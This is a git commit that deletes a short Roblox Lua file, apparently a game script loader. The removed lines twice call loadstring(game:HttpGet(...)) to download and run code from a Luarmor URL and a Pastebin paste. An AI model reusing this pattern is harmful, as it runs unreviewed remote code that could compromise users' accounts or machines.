d7bc28ab003a07472020f95eefdb7c1792f26783
bestsabscripts <masapara190@gmail.com>
2026-04-18 12:32:48 +0300

    Delete ogluckyblock.lua

--- ogluckyblock.lua
+++
@@ -1,7 +0,0 @@
-task.spawn(function()
-loadstring(game:HttpGet("https://api.luarmor.net/files/v4/loaders/583e63cb6b4c4b78d6a9e05560e3275b.lua"))()
-    end)
-
-task.spawn(function()
-   loadstring(game:HttpGet("https://pastebin.com/raw/gdPLWmFG"))()
-end)
